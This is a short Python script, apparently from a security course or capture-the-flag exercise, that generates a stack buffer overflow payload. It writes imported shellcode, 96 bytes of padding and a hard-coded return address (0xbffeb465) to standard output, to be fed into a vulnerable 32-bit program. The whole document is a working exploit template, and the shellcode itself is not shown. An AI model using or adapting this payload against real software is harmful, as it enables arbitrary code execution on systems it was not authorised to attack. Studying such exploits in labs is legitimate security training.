import sys
from shellcode import shellcode
sys.stdout.buffer.write(shellcode+b'a'*96+b"\x65\xb4\xfe\xbf")